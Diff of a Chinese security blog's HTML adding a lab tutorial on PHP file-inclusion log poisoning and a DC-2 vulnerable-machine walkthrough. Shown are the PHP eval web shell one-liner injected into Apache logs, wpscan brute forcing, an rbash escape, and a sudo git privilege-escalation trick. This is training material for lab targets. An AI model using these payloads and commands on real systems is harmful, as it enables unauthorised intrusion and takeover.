-$ ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
-$ ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --ostext &#39;windows server 2008 r2&#39;</code></pre><h5 id="3-gfto"><a href="#3-gfto" class="headerlink" title="3.gfto"></a>3.gfto</h5><p>gtfo是一个纯粹用python3编写的工具，用于搜索GTFOBins和LOLBAS上的二进制文件。</p>
-<p>github项目地址： </p>
-<pre><code>https://github.com/mzfr/gtfo</code></pre><p>很明显，从以上描述里，我们知道这款工具并不是主角，需要重点关注的是GTFOBins和LOLBAS。</p>
-<p>GTFOBins：Linux命令提权辅助查询.</p>
-<h5 id="4-Beroot"><a href="#4-Beroot" class="headerlink" title="4.Beroot"></a>4.Beroot</h5><p>BeRoot Project是一个利用后的工具，可以检查常见的错误配置，以找到提升我们特权的方法，该项目可在Windows，Linux和Mac OS上运行。</p>
-<p>github项目地址：</p>
-<pre><code>https://github.com/AlessandroZ/BeRoot</code></pre><h5 id="5-Vulmap"><a href="#5-Vulmap" class="headerlink" title="5.Vulmap"></a>5.Vulmap</h5><p>Vulmap是一个开源的在线本地漏洞扫描程序项目。它由适用于Windows和Linux操作系统的联机本地漏洞扫描程序组成。</p>
-<p>Github项目地址：</p>
-<pre><code>https://github.com/vulmon/Vulmap</code></pre><h5 id="6-WindowsVulnScan"><a href="#6-WindowsVulnScan" class="headerlink" title="6.WindowsVulnScan"></a>6.WindowsVulnScan</h5><p>这是一款基于主机的漏洞扫描工具，查看查找主机上具有的CVE和具有公开EXP的CVE。</p>
-<p>github项目地址：</p>
-<pre><code>https://github.com/chroblert/WindowsVulnScan</code></pre><h5 id="7、ATRoot-Auxiliary-v2-0"><a href="#7、ATRoot-Auxiliary-v2-0" class="headerlink" title="7、ATRoot Auxiliary v2.0"></a>7、ATRoot Auxiliary v2.0</h5><p>基于java开发的提权辅助工具，支持双端加载，本地模式配置文件存放于本地软件目录下的conf目录；远程模式则可以更新配置文件</p>
-<h5 id="8、在线提权漏洞检测平台"><a href="#8、在线提权漏洞检测平台" class="headerlink" title="8、在线提权漏洞检测平台"></a>8、在线提权漏洞检测平台</h5><p>一款为主流 Linux/Unix 和 Windows 系统提供精准且高效的操作系统脆弱性漏洞检测的专业化平台，基于其强大的安全检测能力，能够给出专业的修复建议，有效验证和加固网络资产漏洞。</p>
-<p>在线查询地址：</p>
-<pre><code>https://detect.secwx.com/</code></pre><h5 id="9-提权辅助网页"><a href="#9-提权辅助网页" class="headerlink" title="9.提权辅助网页"></a>9.提权辅助网页</h5><p>在Windows提权的时候，对比补丁找Exp很烦吧？老是忘记一些提权命令跟工具的语法很苦逼吧？没事，有了这款工具什么问题都解决~</p>
-<p>在线查询地址：</p>
-<pre><code>http://bugs.hacking8.com/tiquan/</code></pre>
+<p>获取日志存放路径</p>
+<p>（一）日志默认路径</p>
+<p>(1) apache+Linux日志默认路径</p>
+<pre class=" language-undefined"><code class="language-undefined">    /etc/httpd/logs/access_log</code></pre>
+<p>或者</p>
+<pre class=" language-bash"><code class="language-bash">    /var/log/httpd/access_log</code></pre>
+<p>(2) apache+win2003日志默认路径</p>
+<pre class=" language-cpp"><code class="language-cpp">    D<span class="token operator">:</span>\xampp\apache\logs\access<span class="token punctuation">.</span>log
+    D<span class="token operator">:</span>\xampp\apache\logs\error<span class="token punctuation">.</span>log</code></pre>
+<p>(3) IIS6.0+win2003默认日志文件</p>
+<pre class=" language-undefined"><code class="language-undefined">    C:\WINDOWS\system32\Logfiles</code></pre>
+<p>(4) IIS7.0+win2003 默认日志文件</p>
+<pre class=" language-undefined"><code class="language-undefined">    %SystemDrive%\inetpub\logs\LogFiles</code></pre>
+<p>(5) nginx 日志文件</p>
+<pre class=" language-bash"><code class="language-bash">    日志文件在用户安装目录logs目录下
+            以我的安装路径为例/usr/local/nginx,
+            那我的日志目录就是在/usr/local/nginx/logs里</code></pre>
+<p>首先，我们直接使用浏览器来构造“php一句话报错请求信息”服务自动记录此一句话信息到服务器日志文件中；<br>具体构造内容：</p>
+<pre class=" language-xml"><code class="language-xml"> http://127.0.0.1:81/FileInclusion/index2.php?file=<span class="token prolog">&lt;?php @eval($_POST[c]);?></span></code></pre>
+<p><img src="https:////upload-images.jianshu.io/upload_images/9272355-f9f0db6a9d7ff53a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/964" alt="img"></p>
+<p>（2）测试结果：失败<br>利用文件包含漏洞直接访问“服务日志文件”，发现文件包含漏洞并未对构造的php一句话进行正常解析，观察发现是构造的PHP一句话中的相关字符在记录进日志文件后，相关的字符被转码了，导致PHP解析失败，具体失败原因见“失败原因分析”</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/9272355-738380f7e8b09e46.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1195" alt="img"></p>
+<p>image.png（3）失败原因分析<br>一句话写入日志文件的利用过程是，利用浏览器直接构造一个关于请求资源的报错信息，消息中包含依据。报错信息服务自动记录到日志文件，但实际测试发现写入日志文件内的报错信息发生了字符转码：<br>日志文件内容如上图所示：</p>
+<pre class=" language-ruby"><code class="language-ruby">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">81</span><span class="token operator">/</span><span class="token constant">FileInclusion</span><span class="token operator">/</span>index2<span class="token punctuation">.</span>php<span class="token operator">?</span>page<span class="token operator">=</span><span class="token operator">%</span>3C<span class="token operator">?</span>php<span class="token operator">%</span><span class="token number">20</span><span class="token variable">@eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">%</span>3E</code></pre>
+<pre class=" language-rust"><code class="language-rust">               <span class="token string">"&lt;"</span>  <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">-></span> 大于号被转码为了 <span class="token operator">%</span>3C
+                <span class="token string">">"</span>  <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">-></span> 小于号被转码为了 <span class="token operator">%</span>3E
+                <span class="token string">" "</span>   <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">-></span> 空格被转码为了 <span class="token operator">%</span><span class="token number">20</span></code></pre>
+<p>最后写入到日志文件中的一句话就变成了 %3C?php%20@eval($_POST[c]);?%3E。</p>
+<p>（4） 失败总结<br>浏览器直接构造的PHP一句话中特殊字符，会被浏览器自动进行URL转义，导致最终写入日志文件中的PHP一句话包含了这些特殊字符，而这些转码后的编码PHP并不能进行正常的解析。<br>（5）构造一句话，写入日志文件测试记录<br>burpsuit 代理抓包改包构造一句话写入日志文件<br>（1） burpsuit 代理抓包，修改浏览器转码字符，写入正确的php一句话木马到服务器日志文件。</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/9272355-ff2a0beae4cc4468.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p>
+<p>（2） 测试记录：成功<br>通过文件包含直接访问服务日志文件，发现一句话被执行成功；</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/9272355-f5d368a6f62b9802.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/889" alt="img"></p>
+<p>在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log，还可以包含Apache的错误访问日志</p>
+<p>首先，构造一个会报错的访问链接，将利用代码（PHP一句话）写入错误日志记录中</p>
+<pre class=" language-ruby"><code class="language-ruby">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">81</span><span class="token operator">/</span><span class="token constant">FileInclusion</span><span class="token operator">/</span>index2<span class="token punctuation">.</span>php<span class="token operator">%</span>3C<span class="token operator">?</span>php<span class="token operator">%</span><span class="token number">20</span><span class="token variable">@eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">%</span>3E</code></pre>
+<p>这个链接直接访问的话，一句话会被编码成%3C?php%20@eval($_POST[c]);?%3E，所以需要使用Burp suite改一下包。</p>
+<p><img src="https:////upload-images.jianshu.io/upload_images/9272355-e094a1b3f7e98f45.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p>
+<p>对所截获的包进行修改，点击go，返回403报错，服务器错误日志文件成功将此次记录到error.log中<br>我们根据日志的路径构造访问路径:</p>
+<pre class=" language-cpp"><code class="language-cpp">http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token operator">:</span><span class="token number">81</span><span class="token operator">/</span>FileInclusion<span class="token operator">/</span>index2<span class="token punctuation">.</span>php<span class="token operator">?</span>file<span class="token operator">=</span>C<span class="token operator">:</span><span class="token operator">/</span>phpStudy<span class="token operator">/</span>Apache<span class="token operator">/</span>logs<span class="token operator">/</span>access<span class="token punctuation">.</span>log</code></pre>
+<p>客户端连接，获取一句话木马</p>
+<h5 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h5><p>利用的条件：</p>
+<p>利用条件：需要知道ssh-log的位置，且可读。默认情况下为 /var/log/auth.log</p>
+<p>姿势：<br>用ssh连接：<br><a href="https://www.jianshu.com/p/7cbc878d64ae" target="_blank" rel="noopener">参考这个网站</a></p>
+<h5 id="包含临时文件"><a href="#包含临时文件" class="headerlink" title="包含临时文件"></a>包含临时文件</h5><p><a href="https://vulhub.org/#/environments/php/inclusion/" target="_blank" rel="noopener">参考这个网站</a></p>
+<hr>
+<p><strong>参考文章</strong>：<a href="https://www.jianshu.com/p/8803aff98bfa" target="_blank" rel="noopener">https://www.jianshu.com/p/8803aff98bfa</a></p>
+<p>​                    <a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/182280.html</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/dc-2-ba-ji-xue-xi/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/04/03/dc-2-ba-ji-xue-xi/" itemprop="url">DC-2靶机学习</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T11:05:39+08:00">
+                2020-04-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">靶机学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="DC-2靶机测试"><a href="#DC-2靶机测试" class="headerlink" title="DC-2靶机测试"></a>DC-2靶机测试</h2><p>[TOC]</p>
+<h4 id="第一步、下载DC-2靶机并进行主机发现"><a href="#第一步、下载DC-2靶机并进行主机发现" class="headerlink" title="第一步、下载DC-2靶机并进行主机发现"></a>第一步、下载DC-2靶机并进行主机发现</h4><p>我们下载安装DC-2靶机。设置.nat连接模式。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200205133827.png" alt=""></p>
+<p>我们使用netdiscover进行主机发现。</p>
+<pre><code>netdiscover -i eth0 -r 192.168.153.0/24</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205102253.png" alt=""></p>
+<p>确定了靶机IP为192.168.153.136</p>
+<h4 id="第二步、信息收集"><a href="#第二步、信息收集" class="headerlink" title="第二步、信息收集"></a>第二步、信息收集</h4><p>我们使用nmap 进行信息收集</p>
+<pre><code>nmap -A -p 1-65535 192.168.153.136 -T4</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205111215.png" alt=""></p>
+<p>我们发现靶机上开放着80端口，并且部署了apache服务器，7744开启了SSH服务。提示是一个wordpress站点</p>
+<p>我们需要首先在host文件下添加<a href="http://dc-2/域名，然后使用浏览器去访问该域名。" target="_blank" rel="noopener">http://dc-2/域名，然后使用浏览器去访问该域名。</a></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200205111308.png" alt=""></p>
+<p>我们使用Wappalyzer进行指纹识别。确定了是一个WordPress的站点。</p>
+<h4 id="第三步、使用Wpscan扫描"><a href="#第三步、使用Wpscan扫描" class="headerlink" title="第三步、使用Wpscan扫描"></a>第三步、使用Wpscan扫描</h4><p>​       该扫描器可以实现获取<code>Wordpress</code>站点用户名，获取安装的所有插件、主题，以及存在漏洞的插件、主题，并提供漏洞信息。同时还可以实现对未加防护的<code>Wordpress</code>站点暴力破解用户名密码。</p>
+<p>我们使用命令扫描网站内的用户名</p>
+<pre><code>wpscan --url dc-2 -e u</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205132051.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200205132034.png" alt=""></p>
+<p>获取到用户名后，我们思考能否爆破密码。</p>
+<p>我们首先使用crel收集网页的信息</p>
+<p>​    Cewl：CeWL是一款以爬虫模式在指定URL上收集单词的工具，可以将它收集到的单词纳入密码字典，以提高密码破解工具的成功率。</p>
+<pre><code>cewl dc-2 -w dict.txt</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205111938.png" alt=""></p>
+<p>得到密码字典后我们继续回到wpscan进行密码爆破、</p>
+<pre><code>wpscan --url dc-2 -P dict.txt</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200205132515.png" alt=""></p>
+<p>我们得到了两个登录的账号和密码。</p>
+<h4 id="第四步、登录后台"><a href="#第四步、登录后台" class="headerlink" title="第四步、登录后台"></a>第四步、登录后台</h4><p>我们通过wpscan发现了默认的后台登录页面。（wp-login.php)</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200205132755.png" alt=""></p>
+<p>我们使用jerry用户进行登录。在其账号中发现了flag2.txt的信息。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200205132930.png" alt=""></p>
+<p>我们翻译一下：</p>
+<p>如果你不能利用WordPress并抄近路，还有别的办法。           </p>
+<p>   希望你能找到另一个切入点。</p>
+<h4 id="第五步、登录ssh"><a href="#第五步、登录ssh" class="headerlink" title="第五步、登录ssh"></a>第五步、登录ssh</h4><pre><code> 我们尝试使用上面两个账户来登陆ssh。首先尝试tom的账户。</code></pre><p><img src="QQ%E6%88%AA%E5%9B%BE20200217113658.png" alt=""></p>
+<p>可以登陆，ls一下可以看到flag3。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200217113757.png" alt=""></p>
+<p>​    但是登陆使用的shell是rBash，功能受到严重限制以至于cat命令都无法使用，所以需要想办法绕过限制。我们先尝试把shell切换为/bin/sh，成功了。继续尝试使用cat来查看flag3中的内容，提示不能找到命令，这时候原因应该是没有将cat命令的目录添加到$PATH中，于是添加之。然后使用cat查看flag3.txt中的内容。<br>rBash和sh shell命令</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200205115512.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200205115956.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200205120014.png" alt=""></p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200205120104.png" alt=""></p>
+<h4 id="第六步、Git提权获得最终flag"><a href="#第六步、Git提权获得最终flag" class="headerlink" title="第六步、Git提权获得最终flag"></a>第六步、Git提权获得最终flag</h4><p>我们先切换到jerry用户，在jerry的家目录下找到flag4.txt</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200205120330.png" alt=""></p>
+<p>flag4 提示我们可以使用git，我们可以通过git来提权</p>
+<p>sudo -l 我们可以看到无需root权限，jerry 可以使用 git ！</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200217123533.png" alt=""></p>
+<p>我们可以利用suid 进行提权</p>
+<p>SUID可以让调用者以文件拥有者的身份运行该文件</p>
+<pre><code>sudo git -p --help</code></pre><p>输入!/bin/bash 获得root权限</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200217123719.png" alt=""></p>
+<p>我们在root目录下找到最后一个flag。</p>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200217123829.png" alt=""></p>
+
           
         
       
@@ -4393,7 +4315,7 @@ $ ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --ostext &#39;w
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-count">30</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
